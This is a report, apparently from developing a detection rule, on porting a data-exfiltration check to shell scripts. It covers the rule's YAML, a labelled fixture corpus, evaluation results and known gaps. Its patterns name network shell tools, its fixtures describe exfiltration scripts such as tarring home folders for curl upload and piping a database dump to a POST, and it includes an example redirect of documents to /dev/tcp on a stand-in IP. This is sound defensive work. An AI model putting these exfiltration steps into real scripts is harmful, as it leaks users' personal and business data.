# `ships-local-data-out` (shell)

A port of the `data_exfiltration` check from
[luantak/is-malicious](https://github.com/luantak/is-malicious) onto shell, built
to the shape the eight shipped `rules/shell/` rules found: `subject: node`,
`state: located`, one construct at a time with the whole script in the state.

## Rule

The final YAML is `rule.yml` beside this file. The parts that carry the result:

```yaml
id: ships-local-data-out
language: Bash
kind: noul
subject: node
state: located
at: 0.41
axis: file
severity: warning
utils:
  gathers_or_ships:
    kind: command
    any:
      - all:
          - has: { stopBy: end, regex: "^(curl|wget|http|https|httpie)$" }
          - has: { stopBy: end, regex: "^(-T|--upload-file|-d|--data|--data-raw|--data-binary|--data-urlencode|-F|--form|--post-file|--post-data)$" }
      - has: { stopBy: end, regex: "^(scp|sftp|rsync|rclone|nc|ncat|socat|mail|mailx|sendmail|mutt|ftp|lftp|tftp)$" }
      - all:
          - has: { stopBy: end, regex: "^(aws|gsutil|az|b2|s3cmd|gcloud|mc)$" }
          - has: { stopBy: end, regex: "^(s3|cp|sync|copy|storage|put|mv)$" }
      - has: { stopBy: end, regex: "^(tar|zip|7z|7za|mysqldump|pg_dump|pg_dumpall|mongodump|sqlite3)$" }
      - all:
          - has: { stopBy: end, regex: "^find$" }
          - has: { stopBy: end, regex: "HOME|Documents|Desktop|Downloads|Library|Mail|AppData|\\.config|/home/|/Users/|/var/lib|/srv" }
rule:
  any:
    - kind: pipeline
      has: { stopBy: end, matches: gathers_or_ships }
    - all:
        - matches: gathers_or_ships
        - not: { inside: { stopBy: end, kind: pipeline } }
ask: >-
  This command moves data belonging to the user or the business off the machine,
  or gathers it for a move, to a destination the job this script exists for does
  not account for.
explain:
  silent_upload: Uploads local files or user content without a matching product purpose.
  bulk_harvest: Walks disks or app data and ships a broad dump outward.
  hidden_channel: Sends data over an unexpected host, webhook, or paste service.
```

`criteria:` and `note:` are long and are in `rule.yml` verbatim.

The matcher deliberately matches **both halves of a transfer** -- the command
that assembles a dump and the command that carries it -- because in shell those
are usually two different lines and either one alone is the whole question when
the other is three lines away. A pipeline is matched whole so that `mysqldump |
curl --data-binary @-` is one subject, and the bare-command branch is guarded by
`not: { inside: { stopBy: end, kind: pipeline } }` so nothing is asked twice.
That guard was enough here: 26 subjects over 11 files, no line matched twice, no
file silently missing.

## Corpus

11 scripts, **26 subjects, 9 bad, 17 clean (14 of them hard)**.

The nine defects:

| subject | defect |
| --- | --- |
| `postinstall.sh:11` | an npm postinstall `tar`s `Documents`, `Desktop` and `.config` out of `$HOME`; an editor-integration package has no reason to open the home directory, and nobody could say afterwards what went |
| `postinstall.sh:13` | `curl -T` of that archive to a `workers.dev` host that appears nowhere else in the script, keyed by hostname and timestamp |
| `mail_index.sh:11` | `rsync` of the whole macOS Mail store to a bare IP; a local search index does not need the mailbox on another machine |
| `mail_index.sh:13` | `tar` of the Notes group container piped over `ssh` into a file on the same IP -- second app data store, same covert peer |
| `schema_drift.sh:13` | `mysqldump` of `customers`, `payments` and `addresses` piped straight into a POST at `telemetry-collect.dev` -- production personal data to an ingest endpoint the script never explains |
| `disk_reclaim.sh:7` | `find "$HOME" -maxdepth 4` for every `.docx`/`.xlsx`/`.kdbx`, `xargs`'d into a `tar`; a disk-reclaim script that collects documents rather than deleting caches |
| `disk_reclaim.sh:10` | `rclone copy` of that archive to `gdrive-personal:inbox` -- a personal cloud remote, which is nobody's build infrastructure |
| `contact_index.sh:10` | `sqlite3` reads every name and email out of the macOS AddressBook store into a dot-file in `/tmp`; a search index is built in the app's own store, not exported to CSV |
| `contact_index.sh:12` | `mail -a` sends that CSV to a numbered gmail address -- the address book leaving to a free mailbox belonging to nobody named in the script |

The fourteen hard cleans are the defect's own shape done legitimately. The five
the brief asked for are all in and all scored below 0.10:

- `nightly_backup.sh:10,12` -- `pg_dump` of the whole production database (the
  broadest possible collection of business data) and `aws s3 cp` of it to the
  team's own bucket, named in the script. **0.09 / 0.05**
- `mirror_push.sh:14` -- `rsync -az --delete` of an entire tree to a remote host
  taken from `$1`. **0.06**
- `crash_upload.sh:14,16` -- `tar` of a directory *under `$HOME`* and `curl -F
  file=@` of it to a crash endpoint: the data is the program's own crash dumps.
  **0.07 / 0.06**
- `release_publish.sh:12,16,19` -- `tar` of a build directory, `curl -F
  file=@dist/…tar.gz` to a release API, `aws s3 cp` into a public bucket.
  **0.04 / 0.04 / 0.04**
- `photo_sync.sh:18` -- `rclone sync` of the user's **entire photo library** to a
  cloud remote. Bulk personal data leaving the machine, and correct: the library
  and the remote both come from a config `acme-photos login` wrote, and the
  script prints both before running. **0.07**

Four more that exist to attack specific branches:

- `support_bundle.sh:11,13,18,20` -- a `find` sweep of an application data store
  under `/var/lib`, a `tar` of logs + config + the swept files, a `tar -tzf |
  head` that *lists what is about to be sent*, and a `curl -T` to a support
  portal keyed by an operator-supplied ticket id. **0.18 / 0.16 / 0.05 / 0.10**
- `schema_drift.sh:9,11` -- `mysqldump` of the same production database and
  `curl --data-binary @` of the result to an internal host, four lines above the
  exfil: `--no-data` is the whole difference. **0.19 / 0.17**

Three cleans sit in the same file as a defect, which the pack's report says is
usually where the cutoff comes from: `postinstall.sh:9` (the package's own `tar`
of `dist/`, two lines above the `$HOME` harvest) at **0.06**,
`disk_reclaim.sh:15` (a `tar` of the service's build metrics, five lines below
the harvest) at **0.10**, and `schema_drift.sh:9` at **0.19**, which *is* the
top clean.

No `# DEFECT`/`# CLEAN` markers anywhere; the labels are in `expect.yml` only.

## Attempts

| # | change | gaps verdict | gap | head | defect floor | cleanTop |
| --- | --- | --- | --- | --- | --- | --- |
| 1 | the sentence as briefed: destination "hidden, unrelated or unexpected", collection breadth, both halves of the transfer | `move` (suggest 0.35) | 0.31 | +0.06 at 0.70 | 0.50 | 0.19 |
| 2 | scoped the unexpected destination to *the destination itself*, not to what the script claims: "a destination nothing stands behind -- a bare IP, an opaque host, an ad-hoc `/var/tmp` path, host-key checking off -- no argument, no config the user wrote, no named service", plus the converse in `note:` ("what makes a destination accounted-for is that something names it and someone could object to it"; a literal `s3://` bucket passes, a literal IP does not) | separates | **0.43** | — | **0.62** | **0.19** |

Attempt 1 already separated cleanly (P 1.00 / R 1.00 at the fitted 0.35). The one
weak spot was `mail_index.sh:11`, the `rsync` of the mail store to a bare IP, at
**0.50** -- the most obviously hostile line in the corpus scoring the lowest of
the nine, because it is the one defect whose header comment offers a coherent
benign story ("keeps a copy so search stays fast after a reinstall") and whose
sink shape (`rsync` to a remote) is shared with a designed hard clean. Attempt 2
did not argue with the story; it made the *destination* the thing being judged.
`mail_index.sh:11` went **0.50 → 0.89**, `mail_index.sh:13` **0.68 → 0.91**, and
the cleans did not move (cleanTop 0.19 → 0.19, `mirror_push` 0.05 → 0.06,
`photo_sync` 0.06 → 0.07). Third attempt not spent: see **What I would change**.

## Fit

Fitted cutoff **0.41** (midpoint of the clean/violation gap), written into `at:`.

- precision **1.00**, recall **1.00** -- tp 9, fp 0, fn 0
- decision flips across 3 passes: **0**
- max pass-to-pass spread: **0.04** (`disk_reclaim.sh:10`); 21 of 26 subjects
  move 0.01 or less
- cleans top out at **0.19** (`schema_drift.sh:9`), next 0.18, then 0.17
- defects start at **0.62** (`contact_index.sh:10`), next 0.83
- gap **0.43** wide, headroom **0.22 / 0.21** on each side
- baseline accepted; re-run at `at: 0.41` reports "same decisions"

The shape of the band is worth recording: the defect floor is the one defect
where *nothing leaves the box on the matched line* -- the `sqlite3` read that
assembles the CSV the next line mails away. Every defect on which bytes actually
move is 0.83 or above, so the real separation for the sending half is ~0.65 wide.
The gathering half costs about 0.25.

## Verdict

**SHIP.** Separates 9 defects from 17 cleans with 0.21 of headroom on each side,
zero flips over three passes, max spread 0.04, and the clean band includes five
constructs designed to be indistinguishable from the defect by shape -- a
whole-library `rclone sync`, a whole-database `pg_dump` to a bucket, an `rsync
--delete` of a whole tree, a `curl -F file=@` upload, and a `tar` of a directory
under `$HOME`. Every one of them is at 0.10 or below, which is the evidence that
the sentence is reading the destination and the provenance rather than the
command name.

## What I would change

- **The third attempt I did not spend** would go at the gathering half. At 0.62
  the `sqlite3` export sits 0.43 above the top clean but 0.21 below the next
  defect, and it is the only subject anywhere near the middle of the band. If a
  real corpus puts more collect-now-send-later pairs in front of this rule, that
  is where the first miss will come from. I left it alone because the fix --
  weighting the assembly step harder -- pushes directly on `support_bundle.sh:11`
  and `:13`, the two cleanest examples of legitimate broad collection, which are
  already the second and fourth highest cleans. That trade is a corpus question,
  not a wording question, and it wants more labelled pairs before it is made.
- **The matcher's blind spot is a redirect to a variable path.** `mysqldump db >
  "$OUT"` is matched because `mysqldump` is in the name list, but `cat
  ~/Documents/*.csv > /dev/tcp/1.2.3.4/443` is not matched at all: there is no
  command in the list, and `/dev/tcp` is a redirect target, which in
  tree-sitter-bash is a sibling of the command rather than a child. The shipped
  `reads-secrets-it-does-not-own` solves the same problem with a
  `redirected_statement` branch keyed on `field: redirect`; a data version would
  need a regex for data *paths*, which is a much worse-defined set than a list of
  credential stores. Left out deliberately, and it is a real gap.
- **`find` needs a path to recognise.** The sweep branch requires a literal
  `$HOME`/`Documents`/`/var/lib`-style root, so `find "$DATA_DIR"` -- the normal
  way a real script writes it -- is invisible. Same class of blind spot the pack
  already records for `cat > "$CRED_DIR/token"`.
- **The `explain:` labels do not partition this corpus**, which is the third rule
  in the pack to report that. `bulk_harvest` and `silent_upload` describe the two
  halves of the *same* incident (`postinstall.sh:11` and `:13`), and
  `hidden_channel` is a property of the destination that applies on top of either
  -- `disk_reclaim.sh:10` is all three at once. They are ported verbatim from the
  source project as instructed; they read as three lenses, not three categories.
- **No real-code evidence.** This rule has never run outside its own fixtures.
  Given the pack's real-code sweep -- `rsync`, `aws s3 cp` and `tar` are all over
  ordinary build scripts -- I would expect this matcher to fire far more often on
  real repositories than any of the eight shipped rules, and the top-clean
  clearance (+0.22 over a fixture clean) is not the same thing as clearance over
  whatever a real `deploy.sh` looks like. That measurement should happen before
  this is switched on anywhere.

## Cost

| run | requests | $ |
| --- | --- | --- |
| `check --dry-run --show-subjects` (×3 during matcher work) | 0 | 0.00000 |
| `gaps` (attempt 1) | 11 | 0.00130 |
| `eval --repeat 1` (attempt 1) | 11 | 0.00130 |
| `eval --repeat 1` (attempt 2) | 11 | 0.00147 |
| `eval --repeat 3` (fit) | 33 | 0.00441 |
| `eval --repeat 3 --accept` (wasted: ran without `--cache none`, produced a null-valued baseline) | 0 | 0.00000 |
| `eval --repeat 3 --accept --cache none` | 33 | 0.00441 |
| `eval --repeat 3` (baseline verification) | 33 | 0.00441 |
| **total** | **132** | **$0.0173** |

~420k input tokens. Budget was $0.10.
